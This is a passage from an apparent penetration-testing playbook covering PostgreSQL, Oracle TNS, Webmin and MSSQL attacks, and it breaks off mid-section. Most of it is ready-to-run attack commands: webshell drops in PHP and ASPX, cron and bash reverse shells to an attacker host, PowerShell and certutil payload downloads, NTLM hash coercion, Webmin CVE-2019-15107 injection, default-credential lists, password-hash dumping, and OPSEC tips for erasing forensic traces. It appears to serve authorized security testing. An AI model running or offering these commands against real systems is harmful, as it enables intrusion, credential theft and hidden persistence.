```bash
# Check if current user has the role
psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c \
  "SELECT pg_has_role(current_user, 'pg_write_server_files', 'MEMBER');"

# Write a PHP webshell (when PG host also serves web content)
psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c \
  "COPY (SELECT '<?php system(\$_GET[\"c\"]); ?>') TO '/var/www/html/shell.php';"

# Write an SSH authorized_keys file (postgres user home)
psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c \
  "COPY (SELECT 'ssh-rsa <YOUR_PUBLIC_KEY> pwn') TO '/var/lib/postgresql/.ssh/authorized_keys';"

# Write a cron job for reverse shell
psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c \
  "COPY (SELECT '* * * * * postgres bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1\"') TO '/etc/cron.d/pwn';"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure psql — no external tools. The COPY TO statement IS the LOTL primitive.
# Confirm writable paths first:
psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c "COPY (SELECT 'test') TO '/tmp/write_test';"
psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c "SELECT pg_read_file('/tmp/write_test');"
```

> **Tip:** `lo_export` will silently no-op if the target path is unwritable by the postgres process user. Confirm the write with a follow-up `pg_read_binary_file` against the same path before triggering.

### Trigger / Coercion

The DLL / binary drop is inert until something loads it. Pair the write primitive with one of:

- **DiagHub LPE (CVE-2019-0863)** — coerce SYSTEM-context Windows Error Reporting service to load the dropped DLL from `C:\windows\system32\` for SYSTEM RCE.
- **DLL hijack** — drop with a name a SYSTEM service auto-loads from `System32` when restarted (`wlbsctrl.dll`, `phoneinfo.dll`, `WptsExtensions.dll`, etc.).
- **Scheduled task** — overwrite or drop alongside an existing task's binary; wait for the next scheduled run.
- **Service auto-start** — replace a service binary the dropped path matches; trigger via `sc start` if you have the privilege, or wait for reboot.
- **Cron** — overwrite a cron-invoked script on Linux (`/etc/cron.*`, `/var/spool/cron/`); next tick fires.

> **Note:** Per engagement scope, prefer additive triggers (a new scheduled task with marker name like `engagement-test-<ts>`) over hijacking existing entries unless persistence-validation is explicitly in scope. See offsec engagement rules §5.

### Cleanup

```bash
# Drop the staging table and unlink the Large Object
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c 'DROP TABLE pwn;'
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c 'SELECT lo_unlink(<OID>);'
```

### OPSEC

- `lo_export` writes leave traces in `pg_largeobject` (the bytes themselves) and `pg_largeobject_metadata` (the OID + owner). `DROP TABLE pwn` alone does NOT remove the LO — the OID lingers until `lo_unlink`.
- Even after `lo_unlink`, deleted LO pages remain in `pg_largeobject` until a `VACUUM` runs. Forensic recovery is possible from the heap pages.
- `VACUUM FULL pg_largeobject;` rewrites the table and physically reclaims the dead tuples — tighter log hygiene at the cost of a noticeable lock + I/O burst.
- PG superuser actions appear in `pg_stat_activity` while running and (if configured) in `log_statement = 'all'` server logs. Inspect `current_setting('log_statement')` before noisy operations.

> **Tip — containerised PG:** When PG runs inside an app stack like ServiceDesk Plus, Confluence, or GitLab, the `postgres` container user often has full filesystem write within the container namespace. Chain `lo_export` to overwrite an app-config file the container's main process re-reads on reload, or to drop a hook into a host-side bind-mounted volume to escape the container.

[↑ Back to top](#table-of-contents)

---

## Phase 14t: Oracle Database (TNS Listener) — TCP 1521

> **Note:** Distinct from [Phase 11: Oracle WebLogic](#phase-11-oracle-weblogic) — that's the Java app server on 7001/T3. This is the Oracle DB Listener on 1521 (TNS protocol). Same vendor, completely different attack surface.

The Oracle TNS (Transparent Network Substrate) Listener fronts every Oracle DB instance and routes connections to a SID / Service Name. The `odat` toolkit is the canonical Oracle pentest weapon — SID brute, cred brute, and seven separate post-auth RCE primitives in one binary.

### Enumeration

```bash
# Banner / version
nmap -sV -Pn -p 1521 <TARGET>
nmap -p 1521 --script oracle-tns-version -Pn <TARGET>
nmap -p 1521 --script oracle-enum-users --script-args oracle-enum-users.sid=<SID> -Pn <TARGET>

# tnscmd10g — pre-Oracle-client legacy probe (still works against modern listeners)
tnscmd10g status   -h <TARGET>
tnscmd10g version  -h <TARGET>
tnscmd10g services -h <TARGET>

# lsnrctl (only if Oracle client is installed locally)
lsnrctl status <TARGET>
```

### SID / Service Name Discovery

The SID is required for every authenticated operation. Brute it before anything else.

```bash
# odat sidguesser — built-in SID list
odat sidguesser -s <TARGET> -p <PORT>

# nmap NSE — pluggable wordlist
nmap -p 1521 --script oracle-sid-brute -Pn <TARGET>
nmap -p 1521 --script oracle-sid-brute \
  --script-args oraclesids=/usr/share/metasploit-framework/data/wordlists/sid.txt \
  -Pn <TARGET>

# Hydra
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt \
  -s 1521 <TARGET> oracle-sid

# Metasploit
msf6 > use auxiliary/scanner/oracle/sid_brute
msf6 > set RHOSTS <TARGET>
msf6 > run

# Common SIDs to try first:
#   XE  ORCL  ORCLCDB  XEXDB  ORCLPDB1  PDBORCL
```

### Default Credentials

```text
scott:tiger                     # Classic demo account (since Oracle 7)
sys:change_on_install           # SYS — DBA role
system:manager                  # SYSTEM — DBA role
dbsnmp:dbsnmp                   # SNMP agent
outln:outln
mdsys:mdsys
ordcommon:ordcommon
ctxsys:ctxsys
dba:dba
```

```bash
# odat password brute against a known SID
odat passwordguesser -s <TARGET> -p <PORT> -d <SID>
odat passwordguesser -s <TARGET> -p <PORT> -d <SID> --accounts-file accounts.txt

# Hydra
hydra -L users.txt -P passwords.txt -s 1521 <TARGET> oracle-listener

# Nmap brute
nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=<SID> -Pn <TARGET>
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2012-1675 | 10g/11g listeners | TNS Poison — register a remote listener with the same service name and MITM client traffic |
| CVE-2009-1979 | 10g/11g | AUTH_SESSKEY pre-auth memory corruption |
| CVE-2017-10202 | 11g/12c | RDBMS Security memory disclosure |
| CVE-2018-3110 | 11.2 / 12.2 (Windows) | Pre-auth RCE in Java VM component |

```bash
# CVE-2012-1675 TNS Poison — quick check
nmap -p 1521 --script oracle-tns-poison -Pn <TARGET>
```

### Authenticated SQL Enumeration

```bash
# sqlplus — normal user
sqlplus <USER>/<PASSWORD>@<TARGET>/<SID>

# sqlplus — as SYSDBA (requires SYSDBA privilege; sys/system usually have it)
sqlplus <USER>/<PASSWORD>@<TARGET>/<SID> as sysdba

# When sqlplus is not available — odat ctxsys gives a SQL-ish primitive
odat ctxsys -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> --getFile /etc/passwd
```

```sql
-- Version + edition
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';

-- All users (DBA only)
SELECT username, account_status, created FROM dba_users;

-- Tables visible to current session
SELECT owner, table_name FROM all_tables ORDER BY owner;

-- Current user's roles + privileges
SELECT * FROM user_role_privs;
SELECT * FROM session_privs;

-- DBA-level privilege audit
SELECT * FROM dba_role_privs WHERE grantee='<USER>';
SELECT privilege FROM dba_sys_privs WHERE grantee='<USER>';

-- Privilege escalation — grant DBA to self (if current user has GRANT ANY ROLE / DBA privs)
EXEC dbms_metadata.open('<USER>');
GRANT DBA TO <USER>;
```

### Exploitation — `odat` Module Suite

`odat all` runs every module against a target — useful for first-pass triage. Drill in with the individual modules once you know which one returned green.

```bash
# All-in-one — runs every check against the credential set
odat all -s <TARGET> -p <PORT> -d <SID> -U <USER> -P <PASSWORD>
```

```bash
# utlfile — file read/write on the DB host (needs CREATE ANY DIRECTORY or UTL_FILE)
odat utlfile -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> \
  --putFile /tmp shell.sh ./shell.sh
odat utlfile -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> \
  --getFile /etc passwd /tmp/passwd.txt

# externaltable — OS command execution via CREATE TABLE ... ORGANIZATION EXTERNAL
# (needs CREATE ANY TABLE + access to a DIRECTORY object)
odat externaltable -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> \
  --exec /tmp shell.sh

# java — Java stored procedure RCE (Linux revshell)
odat java -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> \
  --exec /bin/bash "-c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"

# dbmsscheduler — DBMS_SCHEDULER OS command exec (Windows revshell)
odat dbmsscheduler -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> \
  --exec "C:\Windows\System32\cmd.exe" "/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/r.ps1')"

# passwords — dump every hash from sys.user$ (needs SYSDBA)
odat passwords -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> --get-passwords

# search — find columns by name across every accessible schema (e.g. "password")
odat search -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> --column password
```

```bash
# Listener for the java/dbmsscheduler revshells
nc -lvnp <ATTACKER_PORT>
```

### Post-Exploit

Once you have a shell on the DB host (or DBA SQL access), the goal is hash extraction, config harvest, and pivot intel.

#### Filesystem layout — `$ORACLE_HOME`

```text
$ORACLE_HOME/network/admin/listener.ora     # Listener config — SIDs, paths, secret listener creds
$ORACLE_HOME/network/admin/tnsnames.ora     # TNS name resolution — other DB hosts the box trusts
$ORACLE_HOME/network/admin/sqlnet.ora       # Network config — auth methods, encryption, wallet location
$ORACLE_HOME/dbs/init<SID>.ora              # Per-instance init params
$ORACLE_HOME/dbs/orapw<SID>                 # Password file (binary; SYS hash material)
```

```bash
# Linux — Oracle process runs as the `oracle` user
ps -ef | grep -i tnslsnr
echo $ORACLE_HOME
ls -la "$ORACLE_HOME/network/admin/"
cat  "$ORACLE_HOME/network/admin/listener.ora"
cat  "$ORACLE_HOME/network/admin/tnsnames.ora"
cat  "$ORACLE_HOME/network/admin/sqlnet.ora"

# Windows — service account, ORACLE_HOME under e.g. C:\app\Administrator\product\<VERSION>\dbhome_1
type %ORACLE_HOME%\network\admin\listener.ora
type %ORACLE_HOME%\network\admin\tnsnames.ora
```

#### Password hash extraction (SYS access required)

The column to dump depends on the Oracle major version — `password` for 10g (DES), `spare4` for 11g+ (SHA1, with optional 12c+ SHA-512 prefix).

```sql
-- Oracle 10g — DES hash in `password`
SELECT name, password FROM sys.user$;

-- Oracle 11g+ — SHA1 hash in `spare4` (S: prefix)
SELECT name, spare4 FROM sys.user$;

-- Both at once (some envs still carry both for compatibility)
SELECT name, password, spare4 FROM sys.user$;
```

```bash
# Hashcat modes
hashcat -m 112   hashes.txt rockyou.txt    # Oracle S — 11g SHA1
hashcat -m 12300 hashes.txt rockyou.txt    # Oracle T — 12c+ SHA-512
hashcat -m 3100  hashes.txt rockyou.txt    # Oracle 10g DES (legacy `password` column)
```

#### Data exfiltration

```sql
-- Targeted dump (one record proves the exposure; don't bulk-extract)
SELECT * FROM <SCHEMA>.<TABLE> WHERE rownum <= 1;

-- Find candidate columns containing secrets across every schema
SELECT owner, table_name, column_name
FROM   all_tab_columns
WHERE  column_name LIKE '%PASSWORD%' OR column_name LIKE '%SECRET%' OR column_name LIKE '%TOKEN%';
```

```bash
# odat search — column-name hunting from outside (no need for sqlplus)
odat search -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> --column password
odat search -s <TARGET> -d <SID> -U <USER> -P <PASSWORD> --column secret
```

#### Marker-of-access

```bash
# Inside the post-exploit shell on the DB host (Linux)
id                                           # confirm uid=oracle (or higher)
hostname
echo $ORACLE_HOME
echo "marker-<USERNAME>-oracletns-$(date +%s)" > "$HOME/marker-<USERNAME>-oracletns.txt"
ls -la "$HOME/marker-<USERNAME>-oracletns.txt"
```

```sql
-- DBA-only proof (read-only) — confirms SYSDBA without writing to sys.user$
SELECT user, sysdate FROM dual;
SELECT count(*) FROM sys.user$;
```

---

## Phase 14u: Webmin / MiniServ (TCP 10000)

Web-based system administration interface running on port 10000 (HTTPS by default), banner `MiniServ X.XXX (Webmin httpd)`. Webmin runs as `root`, so any RCE here is immediate root. Service identification, default-cred spray, and `hydra` brute-force on `/session_login.cgi` live in [enumeration-methodology.md](enumeration-methodology.md#328-webmin--miniserv-tcp-10000); this phase covers the exploit-domain CVE chain.

### Exploitation — CVE-2019-15107 Unauthenticated RCE (password_change.cgi)

```bash
# Vulnerability condition: password expiry/change feature enabled (default in
# the compromised supply-chain Webmin builds 1.890–1.920 distributed via
# SourceForge). The `expired=2` flag is the trigger that bypasses auth and
# routes the request into the vulnerable password-change codepath. The `old=`
# value is concatenated into a shell pipeline, so URL-encoded `|`, backticks,
# or `$(...)` give arbitrary command execution as root.

# Required POST body shape:
#   user=root&pam=&expired=2&old=<INJECTION>&new1=test&new2=test

# id-injection PoC — `old=id|` URL-encoded as `id%7C`
curl -k 'https://<TARGET>:10000/password_change.cgi' \
  --data 'user=root&pam=&expired=2&old=id%7C&new1=test&new2=test'

# Reverse-shell variant — bash TCP redirect URL-encoded into `old=`
curl -k 'https://<TARGET>:10000/password_change.cgi' \
  --data 'user=root&pam=&expired=2&old=bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>+0>%261%7C&new1=test&new2=test'

# Catch the callback
nc -lvnp <ATTACKER_PORT>
```

```bash
# Metasploit one-liner — note SSL true (port 10000 is HTTPS by default)
msfconsole -q -x "use exploit/unix/webapp/webmin_backdoor; \
set RHOSTS <TARGET>; \
set RPORT 10000; \
set SSL true; \
set LHOST <ATTACKER_IP>; \
set LPORT <ATTACKER_PORT>; \
run"
```

### Exploitation — CVE-2019-15642 Authenticated RCE (rpc.cgi)

```bash
# Requires valid Webmin creds (PAM-backed, so any cracked OS password works
# — and vice versa: any Webmin password you crack likely logs in via SSH).
# rpc.cgi accepts a serialized Perl object whose CGI body is eval'd server-side.
curl -k -X POST 'https://<TARGET>:10000/rpc.cgi' \
  -H "Authorization: Basic $(echo -n '<USER>:<PASSWORD>' | base64)" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'OBJECT CGI;print "Content-Type: Test\n\n";$cmd=`id`;print "$cmd";'
```

### Exploitation — Package Updates Command Injection (Authenticated, Burp)

```bash
# Navigate: Webmin -> System -> Software Package Updates -> Update Selected Packages
# Intercept POST to /package-updates/update.cgi with Burp.
# Inject into the `u` parameter:
#   u=acl%2Fapt&u=$(whoami)

# Reverse-shell payload — ${IFS} bypasses space filtering
echo -n 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"' | base64
# Final URL-encoded payload:
#   u=acl%2Fapt&u=echo${IFS}<BASE64_OUTPUT>|base64${IFS}-d|bash

nc -lvnp <ATTACKER_PORT>
# Forward the request in Burp.
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2019-15107 | Webmin 1.890–1.920 (compromised SourceForge build, password expiry enabled) | Unauth RCE as root via `password_change.cgi` `old=` injection |
| CVE-2019-15642 | Webmin ≤ 1.920 | Authenticated RCE via Perl eval in `rpc.cgi` |
| CVE-2022-0824 | Webmin ≤ 1.984 | Authenticated RCE via File Manager websocket |
| CVE-2022-36446 | Webmin ≤ 1.997 | Authenticated RCE via Software Package Updates (`update.cgi` `u` param) |

### Post-Exploit

```bash
# Webmin runs as root by default — RCE is immediate root
id    # uid=0(root) gid=0(root)

# Local Webmin user/hash store — PAM-backed in most installs but local hashes
# may exist for non-PAM accounts. Read-only proof for credential reach.
ls -la /etc/webmin/miniserv.users
cat /etc/webmin/miniserv.users
# Format: user:hash:lastchange:...:permissions
# MD5/SHA-512 crypt hashes — feed to hashcat (mode 500 / 1800)

# Config — confirms version, listening port, SSL mode, modules enabled
cat /etc/webmin/version
cat /etc/webmin/miniserv.conf | grep -E '^(port|ssl|listen)='

# Sessions — active Webmin sessions (file-backed)
ls -la /var/webmin/sessiondb.pag /var/webmin/sessiondb.dir 2>/dev/null

# Marker file — root-only writable location proves uid=0 was reached
echo "marker-engagement-webmin-cve2019-15107-$(date +%s)" > /root/marker-engagement-webmin-$(date +%s).txt
ls -la /root/marker-engagement-webmin-*.txt

# PAM cross-pollination — Webmin authenticates against /etc/shadow on most
# distros, so any cracked hash here also logs in via SSH and vice versa.
# Read /etc/shadow as proof of root rather than appending — see persistence-vector rule.
head -5 /etc/shadow
```

[↑ Back to top](#table-of-contents)

---

## Phase 14v: Microsoft SQL Server (TCP 1433)

> **Context:** Post-foothold playbook for MSSQL after credentials are obtained (spray, hash, or Windows-auth). Walks from initial `impacket-mssqlclient` connect through eight RCE/abuse primitives — `xp_cmdshell`, `EXECUTE AS LOGIN`, linked-server hops (including nested `OPENQUERY`), NTLM coercion, OLE Automation, CLR Assembly UNSAFE, file read, file write — and finishes with the database-foothold-to-domain pivot. For AD-specific MSSQL attacks (linked-server abuse in a forest, Silver Tickets targeting MSSQL SPNs), see [active-directory-methodology.md](active-directory-methodology.md). For cracking captured NTLMv2 hashes see [password-cracking.md](password-cracking.md) Phase 5.2.

### Enumeration

```bash
# Service fingerprint
nmap -p 1433 -sV --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password <TARGET>
nmap -p 1434 -sU --script=ms-sql-info <TARGET>           # SQL Browser (UDP)

# Connect with SQL authentication
impacket-mssqlclient <USER>:<PASSWORD>@<TARGET>

# Connect with Windows authentication (domain user)
impacket-mssqlclient <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth

# Connect using NTLM hash (pass-the-hash, no password needed)
impacket-mssqlclient <DOMAIN>/<USER>@<TARGET> -windows-auth -hashes :<NT_HASH>

# Test credentials via netexec
netexec mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>

# Execute a quick command via netexec
netexec mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -x 'whoami'

# One-shot sysadmin check (no interactive session)
netexec mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -q 'SELECT IS_SRVROLEMEMBER(''sysadmin'')'
```

### Default Credentials

```text
sa:                 (blank — legacy installer default)
sa:sa
sa:password
sa:sql
sa:Password1!
sa:<INSTANCE_NAME>  (sometimes mirrors the named-instance string)
```

```bash
# Spray
netexec mssql <TARGET> -u sa -p /usr/share/wordlists/rockyou.txt --no-bruteforce
hydra -L users.txt -P pass.txt mssql://<TARGET>
crackmapexec mssql <TARGET> -u users.txt -p pass.txt --continue-on-success
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2020-0618 | SQL Server Reporting Services 2012–2016 | Pre-auth deserialization RCE on `/ReportServer` |
| CVE-2021-1636 | SQL Server 2017/2019 (pre-CU) | Privesc via stored-proc injection |
| CVE-2018-8273 | SQL Server 2012–2017 | RCE via crafted query (post-auth) |
| Legacy        | sa:blank everywhere   | Still ships in lab/SCCM/dev images and 3rd-party app installers |

### Post-Exploit

#### Enumeration (Inside `mssqlclient.py`)

```sql
-- All commands below run inside the impacket-mssqlclient interactive session.

-- Current identity / privilege
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Databases / tables / data
SELECT name FROM master.dbo.sysdatabases;
SELECT TABLE_NAME FROM <DB>.INFORMATION_SCHEMA.TABLES;
SELECT * FROM <DB>.dbo.<TABLE>;

-- Current user's server-level permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Enumerate logins
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S','U','G');

-- Who can the current login impersonate? (privesc target list)
SELECT DISTINCT b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Linked servers (lateral movement targets)
EXEC sp_linkedservers;
SELECT srvname, isremote FROM sysservers;
SELECT * FROM master..sysservers;
```

#### Domain SID Enumeration via `SUSER_SID()` (No LDAP/SMB/Kerberos Needed)

When MSSQL is domain-joined, `SUSER_SID()` resolves any domain principal to its binary SID without requiring LDAP/SMB/Kerberos access. Useful when those protocols are firewalled but SQL is reachable.

```sql
-- Extract the domain SID (first 48 bytes = domain SID; last 4 bytes = user RID)
SELECT SUSER_SID('<DOMAIN>\Domain Admins');
-- Convert to readable format
SELECT CONVERT(VARCHAR(100), SUSER_SID('<DOMAIN>\Domain Admins'), 1);

-- Extract domain SID base (RID 500 = Administrator, known RID)
SELECT SUSER_SID('<DOMAIN>\Administrator');

-- Enumerate users by RID brute (RIDs 500-1200 cover most accounts)
-- Build the binary SID: domain_sid_base + little-endian RID
DECLARE @i INT = 500;
WHILE @i < 1200 BEGIN
  BEGIN TRY
    SELECT @i AS RID, SUSER_SNAME(SUSER_SID('<DOMAIN>\Administrator') + CAST(@i - 500 AS VARBINARY(4)));
  END TRY BEGIN CATCH END CATCH
  SET @i = @i + 1;
END

-- Simpler: resolve known group names to confirm domain trust
SELECT SUSER_SNAME(SUSER_SID('<DOMAIN>\Domain Users'));
SELECT SUSER_SNAME(SUSER_SID('<DOMAIN>\Domain Computers'));
SELECT SUSER_SNAME(SUSER_SID('<DOMAIN>\Enterprise Admins'));
```

```bash
# From impacket-mssqlclient — one-shot domain SID extraction
impacket-mssqlclient <USER>:<PASSWORD>@<TARGET> -windows-auth -q \
  "SELECT CONVERT(VARCHAR(100), SUSER_SID('<DOMAIN>\Domain Admins'), 1);"
```

#### Living-off-the-land / LOTL variant

```sql
-- Pure T-SQL — no external tools. SUSER_SID/SUSER_SNAME are built-in functions.
-- Reverse-lookup: given a SID, return the principal name
SELECT SUSER_SNAME(0x0105000000000005150000003E962C7A11A4975B649E2C5E01020000);
```

#### `xp_cmdshell` — Direct Command Execution (sysadmin)

```sql
-- impacket-mssqlclient built-in helper (saves the sp_configure dance)
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

-- Manual enable via sp_configure
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- OS commands
EXEC xp_cmdshell 'whoami /all';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';

-- Stage and execute a payload
EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<ATTACKER_IP>/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe';
```

#### `EXECUTE AS LOGIN` — Privesc via Impersonation

```sql
-- Confirm there is something to impersonate
SELECT DISTINCT b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Take on sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;                              -- => sa
SELECT IS_SRVROLEMEMBER('sysadmin');             -- => 1

-- Now enable xp_cmdshell as sa
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Drop the impersonation when done
REVERT;

-- Chain: current login → INTERMEDIATE_USER → sa
EXECUTE AS LOGIN = '<INTERMEDIATE_USER>';
EXECUTE AS LOGIN = 'sa';
```

#### Linked-Server Exploitation

```sql
-- Enumerate
EXEC sp_linkedservers;
SELECT * FROM master..sysservers;

-- Identity / privilege on the remote
SELECT * FROM OPENQUERY(<LINKED_SERVER>, 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY(<LINKED_SERVER>, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Databases on the remote
SELECT * FROM OPENQUERY(<LINKED_SERVER>, 'SELECT name FROM master.dbo.sysdatabases');

-- EXEC-AT — enable xp_cmdshell on the remote, then run a command
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [<LINKED_SERVER>];
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<LINKED_SERVER>];
EXEC ('EXEC xp_cmdshell ''whoami'';') AT [<LINKED_SERVER>];

-- Nested OPENQUERY — chain LINKED_A → LINKED_B (note the doubled / quadrupled single-quote escapes)
SELECT * FROM OPENQUERY(<LINKED_A>, 'SELECT * FROM OPENQUERY(<LINKED_B>, ''SELECT SYSTEM_USER'')');

-- Enable xp_cmdshell on LINKED_B *through* LINKED_A
SELECT * FROM OPENQUERY(<LINKED_A>, 'SELECT * FROM OPENQUERY(<LINKED_B>, ''EXEC sp_configure ''''show advanced options'''', 1; RECONFIGURE;'')');
SELECT * FROM OPENQUERY(<LINKED_A>, 'SELECT * FROM OPENQUERY(<LINKED_B>, ''EXEC sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'')');
SELECT * FROM OPENQUERY(<LINKED_A>, 'SELECT * FROM OPENQUERY(<LINKED_B>, ''EXEC xp_cmdshell ''''whoami'''';'')');

-- EXEC-AT + OPENQUERY hybrid (useful when one side blocks one form but not the other)
EXEC ('SELECT * FROM OPENQUERY(<LINKED_B>, ''SELECT SYSTEM_USER'')') AT [<LINKED_A>];
```

#### NTLM Coercion (Hash Stealing) — `xp_dirtree` / `xp_fileexist` / `xp_subdirs` / OPENROWSET

```bash
# Attacker side first — Responder for capture, ntlmrelayx for relay
sudo responder -I tun0
# OR
impacket-ntlmrelayx -t smb://<TARGET> -smb2support -i
```

```sql
-- Force the MSSQL service account to authenticate to the attacker → captures NTLMv2
EXEC xp_dirtree '\\<ATTACKER_IP>\share', 1, 1;
EXEC xp_fileexist '\\<ATTACKER_IP>\share\file';
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share';

-- OPENROWSET SQLNCLI variant (alternative when xp_dirtree is filtered)
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=\\<ATTACKER_IP>\share;Trusted_Connection=yes;', 'SELECT 1');
```

```bash
# Crack the captured NTLMv2 (see password-cracking.md Phase 5.2 for tuning)
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

#### OLE Automation Procedures (`xp_cmdshell` Alternative)

```sql
-- When xp_cmdshell is disabled but OLE Automation is allowed (sysadmin still required).
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- Run a command via wscript.shell
DECLARE @output INT;
EXEC sp_OACreate 'wscript.shell', @output OUT;
EXEC sp_OAMethod @output, 'run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\output.txt';

-- Read the output back through SQL (BULK INSERT into a temp table)
CREATE TABLE #output (line VARCHAR(8000));
BULK INSERT #output FROM 'C:\Windows\Temp\output.txt';
SELECT * FROM #output;
DROP TABLE #output;

-- Reverse shell via OLE
DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUT;
EXEC sp_OAMethod @shell, 'run', NULL, 'cmd.exe /c powershell -e <BASE64_PAYLOAD>';
```

#### CLR Assembly UNSAFE (when `xp_cmdshell` AND OLE are both blocked)

```sql
-- Enable CLR + disable strict-security so UNSAFE assemblies can be loaded
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;

-- TRUSTWORTHY required for UNSAFE assemblies in non-sysadmin-owned DBs
ALTER DATABASE msdb SET TRUSTWORTHY ON;

-- Compile your .NET DLL, hex-encode it, then load.
-- Example C# source (compile to DLL, then `xxd -p clr_payload.dll | tr -d '\n'` for the hex):
--   using System; using System.Diagnostics; using Microsoft.SqlServer.Server;
--   public class StoredProcedures {
--       [SqlProcedure] public static void cmd_exec(string cmd) {
--           Process.Start("cmd.exe", "/c " + cmd);
--       }
--   }
CREATE ASSEMBLY clr_payload FROM 0x<HEX_BYTES> WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmd_exec] @cmd NVARCHAR(4000)
AS EXTERNAL NAME [clr_payload].[StoredProcedures].[cmd_exec];

-- Execute via the CLR stored procedure
EXEC cmd_exec 'whoami';
EXEC cmd_exec 'powershell -e <BASE64_PAYLOAD>';

-- Cleanup
DROP PROCEDURE cmd_exec;
DROP ASSEMBLY clr_payload;
```

#### Reading Local Files (no `xp_cmdshell`, no OLE)

```sql
-- Whole-file reads via OPENROWSET BULK
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS data;
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS data;
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\flag.txt', SINGLE_CLOB) AS data;

-- Line-by-line reads when SINGLE_CLOB is too coarse
CREATE TABLE #filedata (line VARCHAR(8000));
BULK INSERT #filedata FROM 'C:\Windows\win.ini';
SELECT * FROM #filedata;
DROP TABLE #filedata;
```

#### Writing Files to Disk (ASPX webshell drop)

```sql
-- Direct webshell drop into IIS webroot via FileSystemObject — no xp_cmdshell required
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @objFile INT, @hr INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @objFile OUT;
EXEC sp_OAMethod @objFile, 'OpenTextFile', @hr OUT, 'C:\inetpub\wwwroot\cmd.aspx', 2, 1;
EXEC sp_OAMethod @hr, 'Write', NULL, '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>';
EXEC sp_OAMethod @hr, 'Close';

-- Simpler alternative when xp_cmdshell IS available
